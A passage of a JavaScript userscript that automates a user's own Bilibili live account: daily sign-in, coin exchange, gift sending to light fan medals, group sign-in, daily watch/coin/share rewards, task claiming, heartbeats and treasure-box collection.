                    if (config.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.CHECK_INTERVAL === undefined) config.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.CHECK_INTERVAL = Essential.Config.CONFIG_DEFAULT.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.CHECK_INTERVAL;
                    config.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.CHECK_INTERVAL = parseInt(config.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.CHECK_INTERVAL, 10);
                    if (config.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.CHECK_INTERVAL < 0) config.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.CHECK_INTERVAL = 0;

                    if (config.AUTO_DAILYREWARD_CONFIG.COIN_CONFIG.NUMBER === undefined) config.AUTO_DAILYREWARD_CONFIG.COIN_CONFIG.NUMBER = Essential.Config.CONFIG_DEFAULT.AUTO_DAILYREWARD_CONFIG.COIN_CONFIG.NUMBER;
                    config.AUTO_DAILYREWARD_CONFIG.COIN_CONFIG.NUMBER = parseInt(config.AUTO_DAILYREWARD_CONFIG.COIN_CONFIG.NUMBER, 10);
                    if (config.AUTO_DAILYREWARD_CONFIG.COIN_CONFIG.NUMBER < 0) config.AUTO_DAILYREWARD_CONFIG.COIN_CONFIG.NUMBER = 0;
                    if (config.AUTO_LOTTERY_CONFIG.STORM_CONFIG.STORM_QUEUE_SIZE < 0) config.AUTO_LOTTERY_CONFIG.STORM_CONFIG.STORM_QUEUE_SIZE = 1;
                    if (config.AUTO_LOTTERY_CONFIG.STORM_CONFIG.STORM_MAX_COUNT < 0) config.AUTO_LOTTERY_CONFIG.STORM_CONFIG.STORM_MAX_COUNT = 0;
                    if (config.AUTO_LOTTERY_CONFIG.STORM_CONFIG.STORM_ONE_LIMIT < 0) config.AUTO_LOTTERY_CONFIG.STORM_CONFIG.STORM_ONE_LIMIT = 1;
                    if($.type(CONFIG.AUTO_GIFT_CONFIG.ROOMID)!='array'){
                        CONFIG.AUTO_GIFT_CONFIG.ROOMID = [0];
                    }
                    if($.type(CONFIG.AUTO_GIFT_CONFIG.EXCLUDE_ROOMID)!='array'){
                        CONFIG.AUTO_GIFT_CONFIG.EXCLUDE_ROOMID = [0];
                    }
                    if (config.AUTO_GIFT_CONFIG.GIFT_INTERVAL === undefined) config.AUTO_GIFT_CONFIG.GIFT_INTERVAL = Essential.Config.AUTO_GIFT_CONFIG.GIFT_INTERVAL;
                    if (config.AUTO_GIFT_CONFIG.GIFT_INTERVAL < 1) config.AUTO_GIFT_CONFIG.GIFT_INTERVAL = 1;
                    if (config.AUTO_GIFT_CONFIG.GIFT_LIMIT === undefined) config.AUTO_GIFT_CONFIG.GIFT_LIMIT = Essential.Config.AUTO_GIFT_CONFIG.GIFT_LIMIT;
                    if (config.AUTO_GIFT_CONFIG.GIFT_LIMIT < 0) config.AUTO_GIFT_CONFIG.GIFT_LIMIT = 86400;
                    if (config.AUTO_LOTTERY_CONFIG.SLEEP_RANGE === undefined) config.AUTO_LOTTERY_CONFIG.SLEEP_RANGE = Essential.Config.AUTO_LOTTERY_CONFIG.SLEEP_RANGE;
                    if (config.DD_BP === undefined) config.DD_BP = Essential.Config.DD_BP;
                    if (config.DD_DM_STORM === undefined) config.DD_DM_STORM = Essential.Config.DD_DM_STORM;
                    return config;
                },
                _copy: (obj) => {
                    return JSON.parse(JSON.stringify(obj));
                },
                load: () => {
                    try {
                        CONFIG = JSON.parse(localStorage.getItem(`${NAME}_CONFIG`)) || {};
                        CONFIG = Essential.Config.fix(CONFIG);
                        if (Object.prototype.toString.call(CONFIG) !== '[object Object]') throw new Error();
                    } catch (e) {
                        CONFIG = Essential.Config._copy(Essential.Config.CONFIG_DEFAULT);
                    }
                    Essential.Config.recurLoad(CONFIG);
                    DEBUG('Essential.Config.load: CONFIG', CONFIG);
                    localStorage.setItem(`${NAME}_CONFIG`, JSON.stringify(CONFIG));
                    BiliPushUtils.Check.sleepTimeRangeBuild();
                },
                save: () => {
                    CONFIG = Essential.Config.recurSave(CONFIG);
                    CONFIG = Essential.Config.fix(CONFIG);
                    Essential.DataSync.down();
                    DEBUG('Essential.Config.save: CONFIG', CONFIG);
                    localStorage.setItem(`${NAME}_CONFIG`, JSON.stringify(CONFIG));
                    window.toast('设置已保存，部分设置需要刷新后生效', 'success');
                },
                clear: () => {
                    CONFIG = Essential.Config._copy(Essential.Config.CONFIG_DEFAULT);
                    Essential.DataSync.down();
                    localStorage.removeItem(`${NAME}_CONFIG`);
                }
            }, // Need Init After Toast.init and AlertDialog.init
            Cache: {
                load: () => {
                    try {
                        CACHE = JSON.parse(localStorage.getItem(`${NAME}_CACHE`));
                        if (Object.prototype.toString.call(CACHE) !== '[object Object]') throw new Error();
                        if (CACHE.version !== VERSION){
                            CACHE.version = VERSION;
                            //Essential.Cache.clear();
                        }
                    } catch (err) {
                        CACHE = {
                            version: VERSION
                        };
                        localStorage.setItem(`${NAME}_CACHE`, JSON.stringify(CACHE));
                    }
                    DEBUG('Essential.Cache.load: CACHE', CACHE);
                },
                save: () => {
                    localStorage.setItem(`${NAME}_CACHE`, JSON.stringify(CACHE));
                },
                clear: () => {
                    CACHE = {
                        version: VERSION
                    };
                    Essential.DataSync.down();
                    localStorage.removeItem(`${NAME}_CACHE`);
                }
            },
            DataSync: {
                init: () => {
                    window[NAME] = {};
                    window[NAME].iframeSet = new Set();
                },
                down: () => {
                    try {
                        window[NAME].Info = Info;
                        window[NAME].CONFIG = CONFIG;
                        window[NAME].CACHE = CACHE;
                        for (const iframe of window[NAME].iframeSet) {
                            if (iframe.promise.down) iframe.promise.down.resolve();
                        }
                    } catch (err) {
                    }
                }
            }
        }; // Only Run in MainScript, Need Init after Toast.init

        const Sign = {
            run: () => {
                try {
                    if (!CONFIG.AUTO_SIGN) return $.Deferred().resolve();
                    if (CACHE.sign_ts && !checkNewDay(CACHE.sign_ts)) {
                        // 同一天，不再检查签到
                        runTomorrow(Sign.run);
                        return $.Deferred().resolve();
                    }
                    return API.sign.doSign().then((response) => {
                        DEBUG('Sign.run: API.sign.doSign', response);
                        if (response.code === 0) {
                            // 签到成功
                            window.toast(`[自动签到]${response.data.text}`, 'success');
                            CACHE.sign_ts = ts_ms();
                            Essential.Cache.save();
                        } else if (response.code === -500 || response.message.indexOf('已') > -1) {
                            // 今天已签到过
                        } else {
                            window.toast(`[自动签到]${response.data.text}`, 'caution');
                            return Sign.run();
                        }
                        runTomorrow(Sign.run);
                    }, () => {
                        window.toast('[自动签到]签到失败，请检查网络', 'error');
                        return delayCall(() => Sign.run());
                    });
                } catch (err) {
                    window.toast('[自动签到]运行时出现异常，已停止', 'error');
                    console.error(`[${NAME}]`, err);
                    return $.Deferred().reject();
                }
            }
        }; // Once Run every day

        const Exchange = {
            run: () => {
                try {
                    if (!CONFIG.SILVER2COIN) return $.Deferred().resolve();
                    if (CACHE.exchange_ts && !checkNewDay(CACHE.exchange_ts)) {
                        // 同一天，不再兑换硬币
                        runTomorrow(Exchange.run);
                        return $.Deferred().resolve();
                    }
                    return Exchange.silver2coin().then(() => {
                        CACHE.exchange_ts = ts_ms();
                        Essential.Cache.save();
                        runTomorrow(Exchange.run);
                    }, () => delayCall(() => Exchange.run()));
                } catch (err) {
                    window.toast('[银瓜子换硬币]运行时出现异常，已停止', 'error');
                    console.error(`[${NAME}]`, err);
                    return $.Deferred().reject();
                }
            },
            silver2coin: () => {
                return API.Exchange.silver2coin().then((response) => {
                    DEBUG('Exchange.silver2coin: API.SilverCoinExchange.silver2coin', response);
                    if (response.code === 0) {
                        // 兑换成功
                        window.toast(`[银瓜子换硬币]${response.msg}`, 'success');
                    } else if (response.code === 403) {
                        // 每天最多能兑换 1 个
                        // 银瓜子余额不足
                        // window.toast(`[银瓜子换硬币]'${response.msg}`, 'info');
                    } else {
                        window.toast(`[银瓜子换硬币]${response.msg}`, 'caution');
                    }
                }, () => {
                    window.toast('[银瓜子换硬币]兑换失败，请检查网络', 'error');
                    return delayCall(() => Exchange.silver2coin());
                });
            }
        }; // Once Run every day


        const Gift = {
            interval: 600e3,
            run_timer: undefined,
            over:false,
            light_gift:30607,
            getMedalList:async () => {
                try{
                    let medal_list = [],curPage = 1,totalpages = 0;
                    do{
                        let response = await API.i.medal(curPage, 25);
                        DEBUG('Gift.getMedalList: API.i.medal', response);
                        medal_list = medal_list.concat(response.data.fansMedalList);
                        curPage = response.data.pageinfo.curPage;
                        totalpages = response.data.pageinfo.totalpages;
                        curPage++;
                    }while(curPage < totalpages);
                    return medal_list;
                }catch(e){
                    window.toast('[自动送礼]获取勋章列表失败，请检查网络', 'error');
                    return await delayCall(() => Gift.getMedalList());
                }
            },
            getBagList:async () => {
                try{
                    let response = await API.gift.bag_list();
                    DEBUG('Gift.getBagList: API.gift.bag_list', response);
                    Gift.time = response.data.time;
                    return response.data.list;
                }catch(e){
                    window.toast('[自动送礼]获取包裹列表失败，请检查网络', 'error');
                    return await delayCall(() => Gift.getBagList());
                }
            },
            getFeedByGiftID: (gift_id) => {
                for (let i = Info.gift_list.length - 1; i >= 0; --i) {
                    if (Info.gift_list[i].id === gift_id) {
                        return Math.ceil(Info.gift_list[i].price / 100);
                    }
                }
                return 0;
            },
            sort_medals:(medals)=>{
                if(CONFIG.AUTO_GIFT_CONFIG.GIFT_SORT){
                    medals.sort((a,b)=>{
                        if(b.level-a.level==0){
                            return b.intimacy-a.intimacy;
                        }
                        return b.level-a.level;
                    });
                }else{
                    medals.sort((a,b)=>{
                        if(a.level-b.level==0){
                            return a.intimacy-b.intimacy;
                        }
                        return a.level-b.level;
                    });
                }
                if(CONFIG.AUTO_GIFT_CONFIG.ROOMID && CONFIG.AUTO_GIFT_CONFIG.ROOMID.length>0){
                    let sortRooms = CONFIG.AUTO_GIFT_CONFIG.ROOMID;
                    sortRooms.reverse();
                    for(let froom of sortRooms){
                        let rindex = medals.findIndex(r=>r.roomid==froom);
                        if(rindex!=-1){
                            let tmp = medals[rindex];
                            medals.splice(rindex,1);
                            medals.unshift(tmp);
                        }
                    }
                }
                return medals;
            },
            auto_light:async(medal_list)=>{
                try{
                    const feed = Gift.getFeedByGiftID(Gift.light_gift);
                    let noLightMedals = medal_list.filter(it=>it.is_lighted==0 && it.day_limit-it.today_feed>=feed && CONFIG.AUTO_GIFT_CONFIG.EXCLUDE_ROOMID.findIndex(exp=>exp==it.roomid)==-1);
                    if(noLightMedals && noLightMedals.length>0){
                        noLightMedals = Gift.sort_medals(noLightMedals);
                        let bag_list = await Gift.getBagList();
                        let heartBags = bag_list.filter(r=>r.gift_id==Gift.light_gift);
                        if(heartBags && heartBags.length > 0){
                            for(let medal of noLightMedals){
                                let gift = heartBags.find(it=>it.gift_id==Gift.light_gift && it.gift_num > 0);
                                if(gift){
                                    let remain_feed = medal.day_limit - medal.today_feed;
                                    if(remain_feed - feed >= 0){
                                        let response = await API.room.room_init(parseInt(medal.roomid, 10));
                                        let send_room_id = parseInt(response.data.room_id, 10);
                                        let feed_num = 1;
                                        let rsp=await API.gift.bag_send(Info.uid, gift.gift_id, medal.target_id, feed_num, gift.bag_id, send_room_id, Info.rnd)
                                        if (rsp.code === 0) {
                                            gift.gift_num -= feed_num;
                                            medal.today_feed += feed_num * feed;
                                            remain_feed -= feed_num * feed;
                                            window.toast(`[自动送礼]勋章[${medal.medalName}] 点亮成功，送出${feed_num}个${gift.gift_name}，[${medal.today_feed}/${medal.day_limit}]距离升级还需[${remain_feed}]`, 'success');
                                        } else {
                                            window.toast(`[自动送礼]勋章[${medal.medalName}] 点亮异常:${rsp.msg}`, 'caution');
                                        }
                                    }
                                    continue;
                                }
                                break;
                            }
                        }
                    }
                }catch(e){
                    console.error(e);
                    window.toast(`[自动送礼]点亮勋章 检查出错:${e}`, 'error');
                }
            },
            run: async () => {
                const func = () => {
                    window.toast('[自动送礼]送礼失败，请检查网络', 'error');
                    return delayCall(() => Gift.run());
                };
                try {
                    if (!CONFIG.AUTO_GIFT) return;
                    if (Gift.run_timer) clearTimeout(Gift.run_timer);
                    Gift.interval = CONFIG.AUTO_GIFT_CONFIG.GIFT_INTERVAL * 60e3;
                    if (CACHE.gift_ts) {
                        const diff = ts_ms() - CACHE.gift_ts;
                        if (diff < Gift.interval) {
                            Gift.run_timer = setTimeout(Gift.run, Gift.interval - diff);
                            return;
                        }
                    }
                    Gift.over = false;
                    let medal_list = await Gift.getMedalList();
                    if(CONFIG.AUTO_GIFT_CONFIG.AUTO_LIGHT){
                        await Gift.auto_light(medal_list);
                    }
                    DEBUG('Gift.run: Gift.getMedalList().then: Gift.medal_list', medal_list);
                    if(medal_list && medal_list.length>0){
                        medal_list = medal_list.filter(it=>it.day_limit-it.today_feed>0 && it.level < 20);
                        medal_list = Gift.sort_medals(medal_list);
                        if(CONFIG.AUTO_GIFT_CONFIG.EXCLUDE_ROOMID && CONFIG.AUTO_GIFT_CONFIG.EXCLUDE_ROOMID.length>0){
                            medal_list = medal_list.filter(r=>CONFIG.AUTO_GIFT_CONFIG.EXCLUDE_ROOMID.findIndex(exp=>exp==r.roomid)==-1);
                        }
                        let bag_list = await Gift.getBagList();
                        for(let v of medal_list){
                            if(Gift.over) break;
                            let remain_feed = v.day_limit - v.today_feed;
                            if(remain_feed > 0){
                                let now = ts_s();
                                if(!CONFIG.AUTO_GIFT_CONFIG.SEND_ALL){
                                    //送之前查一次有没有可送的
                                    let pass = bag_list.filter(r=>![4, 3, 9, 10].includes(r.gift_id) && r.gift_num > 0 && r.expire_at > now && (r.expire_at - now < CONFIG.AUTO_GIFT_CONFIG.GIFT_LIMIT));
                                    if(pass.length==0){
                                        break;
                                    }else{
                                        bag_list = pass;
                                    }
                                }
                                window.toast(`[自动送礼]勋章[${v.medalName}] 今日亲密度未满[${v.today_feed}/${v.day_limit}]，预计需要[${remain_feed}]送礼开始`, 'info');
                                await Gift.sendGift(v,bag_list);
                            }else {
                                window.toast(`[自动送礼]勋章[${v.medalName}] 今日亲密度已满`, 'info');
                            }
                        }
                        CACHE.gift_ts = ts_ms();
                        Essential.Cache.save();
                    }
                    await delayCall(() => Gift.run(),Gift.interval);
                } catch (err) {
                    func();
                    window.toast('[自动送礼]运行时出现异常，已停止', 'error');
                    console.error(`[${NAME}]`, err);
                }
            },
            sendGift:async (medal,bag_list = []) => {
                if (Gift.time <= 0) Gift.time = ts_s();
                let ruid = medal.target_id;
                let remain_feed = medal.day_limit - medal.today_feed;
                if(remain_feed<=0){
                    window.toast(`[自动送礼]勋章[${medal.medalName}] 今日亲密度已满`, 'info');
                    return;
                }
                let response = await API.room.room_init(parseInt(medal.roomid, 10));
                let room_id = parseInt(response.data.room_id, 10);
                if(bag_list.length == 0){
                    bag_list = await Gift.getBagList();
                }
                let now = ts_s();
                if(!CONFIG.AUTO_GIFT_CONFIG.SEND_ALL){
                    //送之前查一次有没有可送的
                    let pass = bag_list.filter(r=>![4, 3, 9, 10].includes(r.gift_id) && r.gift_num > 0 && r.expire_at > now && (r.expire_at - now < CONFIG.AUTO_GIFT_CONFIG.GIFT_LIMIT));
                    if(pass.length == 0){
                        Gift.over = true;
                        return;
                    }else{
                        bag_list = pass;
                    }
                }
                for(const v of bag_list){
                    if (remain_feed <= 0) {
                        window.toast(`[自动送礼]勋章[${medal.medalName}] 送礼结束，今日亲密度已满[${medal.today_feed}/${medal.day_limit}]`, 'info');
                        return;
                    }
                    if ((
                        //特殊礼物排除
                        (![4, 3, 9, 10].includes(v.gift_id)
                         //满足到期时间
                         && v.expire_at > Gift.time && (v.expire_at - Gift.time < CONFIG.AUTO_GIFT_CONFIG.GIFT_LIMIT)
                        )
                        //或者全部送满
                        || CONFIG.AUTO_GIFT_CONFIG.SEND_ALL)
                        //永久礼物不自动送
                        && v.expire_at > Gift.time){
                        // 检查SEND_ALL和礼物到期时间 送当天到期的
                        const feed = Gift.getFeedByGiftID(v.gift_id);
                        if (feed > 0) {
                            let feed_num = Math.floor(remain_feed / feed);
                            if (feed_num > v.gift_num) feed_num = v.gift_num;
                            if (feed_num > 0) {
                                try{
                                    let response = await API.gift.bag_send(Info.uid, v.gift_id, ruid, feed_num, v.bag_id, room_id, Info.rnd);
                                    DEBUG('Gift.sendGift: API.gift.bag_send', response);
                                    if (response.code === 0) {
                                        v.gift_num -= feed_num;
                                        medal.today_feed += feed_num * feed;
                                        remain_feed -= feed_num * feed;
                                        window.toast(`[自动送礼]勋章[${medal.medalName}] 送礼成功，送出${feed_num}个${v.gift_name}，[${medal.today_feed}/${medal.day_limit}]距离升级还需[${remain_feed}]`, 'success');
                                    } else {
                                        window.toast(`[自动送礼]勋章[${medal.medalName}] 送礼异常:${response.msg}`, 'caution');
                                    }
                                }catch(e){
                                    window.toast('[自动送礼]包裹送礼失败，请检查网络', 'error');
                                    return await delayCall(() => Gift.sendGift(medal));
                                }
                            }
                        }
                    }
                }
            }
        }; // Once Run every 10 minutes

        const GroupSign = {
            getGroups: () => {
                return API.Group.my_groups().then((response) => {
                    DEBUG('GroupSign.getGroups: API.Group.my_groups', response);
                    if (response.code === 0) return $.Deferred().resolve(response.data.list);
                    window.toast(`[自动应援团签到]'${response.msg}`, 'caution');
                    return $.Deferred().reject();
                }, () => {
                    window.toast('[自动应援团签到]获取应援团列表失败，请检查网络', 'error');
                    return delayCall(() => GroupSign.getGroups());
                });
            },
            signInList: (list, i = 0) => {
                if (i >= list.length) return $.Deferred().resolve();
                const obj = list[i];
                //自己不能给自己的应援团应援
                if(obj.owner_uid==Info.uid) return GroupSign.signInList(list, i + 1);
                return API.Group.sign_in(obj.group_id, obj.owner_uid).then((response) => {
                    DEBUG('GroupSign.signInList: API.Group.sign_in', response);
                    const p = $.Deferred();
                    if (response.code === 0) {
                        if (response.data.add_num > 0) {
                            window.toast(`[自动应援团签到]应援团(group_id=${obj.group_id},owner_uid=${obj.owner_uid})签到成功，当前勋章亲密度+${response.data.add_num}`, 'success');
                            p.resolve();
                        } else if (response.data.status === 1) {
                            p.resolve();
                        } else {
                            p.reject();
                        }
                    } else {
                        window.toast(`[自动应援团签到]'${response.msg}`, 'caution');
                        return GroupSign.signInList(list, i);
                    }
                    return $.when(GroupSign.signInList(list, i + 1), p);
                }, () => {
                    window.toast(`[自动应援团签到]应援团(group_id=${obj.group_id},owner_uid=${obj.owner_uid})签到失败，请检查网络`, 'error');
                    return delayCall(() => GroupSign.signInList(list, i));
                });
            },
            run: () => {
                try {
                    if (!CONFIG.AUTO_GROUP_SIGN) return $.Deferred().resolve();
                    if (CACHE.group_sign_ts && !checkNewDay(CACHE.group_sign_ts)) {
                        // 同一天，不再检查应援团签到
                        runTomorrow(GroupSign.run);
                        return $.Deferred().resolve();
                    }
                    return GroupSign.getGroups().then((list) => {
                        return GroupSign.signInList(list).then(() => {
                            CACHE.group_sign_ts = ts_ms();
                            runTomorrow(GroupSign.run);
                        }, () => delayCall(() => GroupSign.run()));
                    }, () => delayCall(() => GroupSign.run()));
                } catch (err) {
                    window.toast('[自动应援团签到]运行时出现异常，已停止', 'error');
                    console.error(`[${NAME}]`, err);
                    return $.Deferred().reject();
                }
            }
        }; // Once Run every day "api.live.bilibili.com"
        const DailyReward = {
            coin_exp: 0,
            login: () => {
                return API.DailyReward.login().then(() => {
                    DEBUG('DailyReward.login: API.DailyReward.login');
                    window.toast('[自动每日奖励][每日登录]完成', 'success');
                }, () => {
                    window.toast('[自动每日奖励][每日登录]完成失败，请检查网络', 'error');
                    return delayCall(() => DailyReward.login());
                });
            },
            watch: (aid, cid) => {
                if (!CONFIG.AUTO_DAILYREWARD_CONFIG.WATCH) return $.Deferred().resolve();
                return API.DailyReward.watch(aid, cid, Info.uid, ts_s()).then((response) => {
                    DEBUG('DailyReward.watch: API.DailyReward.watch', response);
                    if (response.code === 0) {
                        window.toast(`[自动每日奖励][每日观看]完成(av=${aid})`, 'success');
                    } else {
                        window.toast(`[自动每日奖励][每日观看]'${response.msg}`, 'caution');
                    }
                }, () => {
                    window.toast('[自动每日奖励][每日观看]完成失败，请检查网络', 'error');
                    return delayCall(() => DailyReward.watch(aid, cid));
                });
            },
            coin: (cards, n, i = 0, one = false) => {
                if (!CONFIG.AUTO_DAILYREWARD_CONFIG.COIN) return $.Deferred().resolve();
                if (DailyReward.coin_exp >= CONFIG.AUTO_DAILYREWARD_CONFIG.COIN_CONFIG.NUMBER * 10) {
                    window.toast('[自动每日奖励][每日投币]今日投币已完成', 'info');
                    return $.Deferred().resolve();
                }
                if (i >= cards.length) {
                    window.toast('[自动每日奖励][每日投币]动态里可投币的视频不足', 'caution');
                    return $.Deferred().resolve();
                }
                const obj = JSON.parse(cards[i].card);
                let num = Math.min(2, n);
                if (one) num = 1;
                return API.DailyReward.coin(obj.aid, num).then((response) => {
                    DEBUG('DailyReward.coin: API.DailyReward.coin', response);
                    if (response.code === 0) {
                        DailyReward.coin_exp += num * 10;
                        window.toast(`[自动每日奖励][每日投币]投币成功(av=${obj.aid},num=${num})`, 'success');
                        return DailyReward.coin(cards, n - num, i + 1);
                    } else if (response.code === -110) {
                        window.toast('[自动每日奖励][每日投币]未绑定手机，已停止', 'error');
                        return $.Deferred().reject();
                    } else if (response.code === 34003) {
                        // 非法的投币数量
                        if (one) return DailyReward.coin(cards, n, i + 1);
                        return DailyReward.coin(cards, n, i, true);
                    } else if (response.code === 34005) {
                        // 塞满啦！先看看库存吧~
                        return DailyReward.coin(cards, n, i + 1);
                    }
                    window.toast(`[自动每日奖励][每日投币]'${response.msg}`, 'caution');
                    return DailyReward.coin(cards, n, i + 1);
                }, () => delayCall(() => DailyReward.coin(cards, n, i)));
            },
            share: (aid) => {
                if (!CONFIG.AUTO_DAILYREWARD_CONFIG.SHARE) return $.Deferred().resolve();
                return API.DailyReward.share(aid).then((response) => {
                    DEBUG('DailyReward.share: API.DailyReward.share', response);
                    if (response.code === 0) {
                        window.toast(`[自动每日奖励][每日分享]分享成功(av=${aid})`, 'success');
                    } else if (response.code === 71000) {
                        // 重复分享
                        window.toast('[自动每日奖励][每日分享]今日分享已完成', 'info');
                    } else {
                        window.toast(`[自动每日奖励][每日分享]'${response.msg}`, 'caution');
                    }
                }, () => {
                    window.toast('[自动每日奖励][每日分享]分享失败，请检查网络', 'error');
                    return delayCall(() => DailyReward.share(aid));
                });
            },
            dynamic: () => {
                return API.dynamic_svr.dynamic_new(Info.uid, 8).then((response) => {
                    DEBUG('DailyReward.dynamic: API.dynamic_svr.dynamic_new', response);
                    if (response.code === 0) {
                        if (response.data.cards[0]) {
                            const obj = JSON.parse(response.data.cards[0].card);
                            const p1 = DailyReward.watch(obj.aid, obj.cid);
                            const p2 = DailyReward.coin(response.data.cards, Math.max(CONFIG.AUTO_DAILYREWARD_CONFIG.COIN_CONFIG.NUMBER - DailyReward.coin_exp / 10, 0));
                            const p3 = DailyReward.share(obj.aid);
                            return $.when(p1, p2, p3);
                        } else {
                            window.toast('[自动每日奖励]"动态-投稿视频"中暂无动态', 'info');
                        }
                    } else {
                        window.toast(`[自动每日奖励]获取"动态-投稿视频"'${response.msg}`, 'caution');
                    }
                }, () => {
                    window.toast('[自动每日奖励]获取"动态-投稿视频"失败，请检查网络', 'error');
                    return delayCall(() => DailyReward.dynamic());
                });
            },
            run: () => {
                try {
                    if (!CONFIG.AUTO_DAILYREWARD) return $.Deferred().resolve();
                    if (CACHE.dailyreward_ts && !checkNewDay(CACHE.dailyreward_ts)) {
                        // 同一天，不执行每日任务
                        runTomorrow(DailyReward.run);
                        return $.Deferred().resolve();
                    }
                    return API.DailyReward.exp().then((response) => {
                        DEBUG('DailyReward.run: API.DailyReward.exp', response);
                        if (response.code === 0) {
                            DailyReward.coin_exp = response.number;
                            DailyReward.login();
                            return DailyReward.dynamic().then(() => {
                                CACHE.dailyreward_ts = ts_ms();
                                runTomorrow(DailyReward.run);
                            });
                        } else {
                            window.toast(`[自动每日奖励]${response.message}`, 'caution');
                        }
                    }, () => {
                        window.toast('[自动每日奖励]获取每日奖励信息失败，请检查网络', 'error');
                        return delayCall(() => DailyReward.run());
                    });
                } catch (err) {
                    window.toast('[自动每日奖励]运行时出现异常', 'error');
                    console.error(`[${NAME}]`, err);
                    return $.Deferred().reject();
                }
            }
        }; // Once Run every day "api.live.bilibili.com"
        const Task = {
            interval: 600e3,
            double_watch_task: false,
            run_timer: undefined,
            MobileHeartbeat: false,
            PCHeartbeat:false,
            run: async () => {
                try {
                    if (!CONFIG.AUTO_TASK) return $.Deferred().resolve();
                    if (!Info.mobile_verify) {
                        window.toast('[自动完成任务]未绑定手机，已停止', 'caution');
                        return $.Deferred().resolve();
                    }
                    if (Task.run_timer) clearTimeout(Task.run_timer);
                    if (CACHE.task_ts && !Task.MobileHeartbeat && !Task.PCHeartbeat) {
                        const diff = ts_ms() - CACHE.task_ts;
                        if (diff < Task.interval) {
                            Task.run_timer = setTimeout(Task.run, Task.interval - diff);
                            return $.Deferred().resolve();
                        }
                    }
                    if (Task.MobileHeartbeat) Task.MobileHeartbeat = false;
                    if (Task.PCHeartbeat) Task.PCHeartbeat = false;
                    return API.i.taskInfo().then(async (response) => {
                        DEBUG('Task.run: API.i.taskInfo', response);
                        for (const key in response.data) {
                            if (typeof response.data[key] === 'object') {
                                if (response.data[key].task_id && response.data[key].status === 1) {
                                    await Task.receiveAward(response.data[key].task_id);
                                }else if (response.data[key].task_id === 'double_watch_task'){
                                    if(response.data[key].status === 0){
                                        Task.double_watch_task = false;
                                        if(Token && TokenUtil && Info.appToken && !Task.double_watch_task){
                                            await BiliPushUtils.API.Heart.mobile_info();
                                        }
                                    }else if(response.data[key].status === 2){
                                        Task.double_watch_task = true;
                                    }else{
                                        Task.double_watch_task = false;
                                    }
                                }
                            }
                        }
                    }).always(() => {
                        CACHE.task_ts = ts_ms();
                        localStorage.setItem(`${NAME}_CACHE`, JSON.stringify(CACHE));
                        Task.run_timer = setTimeout(Task.run, Task.interval);
                    }, () => delayCall(() => Task.run()));
                } catch (err) {
                    window.toast('[自动完成任务]运行时出现异常，已停止', 'error');
                    console.error(`[${NAME}]`, err);
                    return $.Deferred().reject();
                }
            },
            receiveAward: async (task_id) => {
                return API.activity.receive_award(task_id).then((response) => {
                    DEBUG('Task.receiveAward: API.activity.receive_award', response);
                    if (response.code === 0) {
                        // 完成任务
                        window.toast(`[自动完成任务]完成任务：${task_id}`, 'success');
                        if (task_id === 'double_watch_task') Task.double_watch_task = true;
                    } else if (response.code === -400) {
                        // 奖励已领取
                        // window.toast(`[自动完成任务]${task_id}: ${response.msg}`, 'info');
                    } else {
                        window.toast(`[自动完成任务]${task_id}: ${response.msg}`, 'caution');
                    }
                }, () => {
                    window.toast('[自动完成任务]完成任务失败，请检查网络', 'error');
                    return delayCall(() => Task.receiveAward(task_id));
                });
            }
        }; // Once Run every 10 minutes
        const MobileHeartbeat = {
            run_timer: undefined,
            run:async () => {
                try {
                    if (!CONFIG.MOBILE_HEARTBEAT) return $.Deferred().resolve();
                    if(Task.double_watch_task) return $.Deferred().resolve();
                    if (MobileHeartbeat.run_timer && !Task.double_watch_task && Info.mobile_verify) {
                        Task.MobileHeartbeat = true;
                        Task.run();
                    }
                    if (MobileHeartbeat.run_timer) clearTimeout(MobileHeartbeat.run_timer);
                    //API.HeartBeat.mobile
                    BiliPushUtils.API.Heart.mobile().then((rsp) => {
                        DEBUG('MobileHeartbeat.run: API.HeartBeat.mobile');
                        MobileHeartbeat.run_timer = setTimeout(MobileHeartbeat.run, 300e3);
                    }, () => delayCall(() => MobileHeartbeat.run()));
                } catch (err) {
                    window.toast('[移动端心跳]运行时出现异常，已停止', 'error');
                    console.error(`[${NAME}]`, err);
                    return $.Deferred().reject();
                }
            }
        }; // Once Run every 5mins
        const WebHeartbeat = {
            run_timer: undefined,
            run: () => {
                try {
                    if (!CONFIG.MOBILE_HEARTBEAT) return $.Deferred().resolve();
                    if (WebHeartbeat.run_timer && !Task.double_watch_task && Info.mobile_verify) {
                        Task.WebHeartbeat = true;
                        Task.run();
                    }
                    if (WebHeartbeat.run_timer) clearTimeout(WebHeartbeat.run_timer);
                    API.HeartBeat.web().then(() => {
                        DEBUG('MobileHeartbeat.run: API.HeartBeat.web');
                        WebHeartbeat.run_timer = setTimeout(WebHeartbeat.run, 300e3);
                    }, () => delayCall(() => WebHeartbeat.run()));
                } catch (err) {
                    window.toast('[WEB端心跳]运行时出现异常，已停止', 'error');
                    console.error(`[${NAME}]`, err);
                    return $.Deferred().reject();
                }
            }
        }; // Once Run every 5mins

        const TreasureBox = {
            timer: undefined,
            time_end: undefined,
            time_start: undefined,
            promise: {
                calc: undefined,
                timer: undefined
            },
            DOM: {
                image: undefined,
                canvas: undefined,
                div_tip: undefined,
                div_timer: undefined
            },
            init: () => {
                if (!CONFIG.AUTO_TREASUREBOX) return $.Deferred().resolve();
                const p = $.Deferred();
                runUntilSucceed(() => {
                    try {
                        if ($('.draw-box.gift-left-part').length) {
                            window.toast('[自动领取瓜子]当前直播间有实物抽奖，暂停领瓜子功能', 'caution');
                            p.resolve();
                            return true;
                        }
                        let treasure_box = $('#gift-control-vm div.treasure-box.p-relative');
                        if (!treasure_box.length) return false;
                        treasure_box = treasure_box.first();
                        treasure_box.attr('id', 'old_treasure_box');
                        treasure_box.hide();
                        const div = $(`<div id="${NAME}_treasure_div" class="treasure-box p-relative" style="min-width: 46px;display: inline-block;float: left;padding: 22px 0 0 15px;"></div>`);
                        TreasureBox.DOM.div_tip = $(`<div id="${NAME}_treasure_div_tip" class="t-center b-box none-select">自动<br>领取中</div>`);
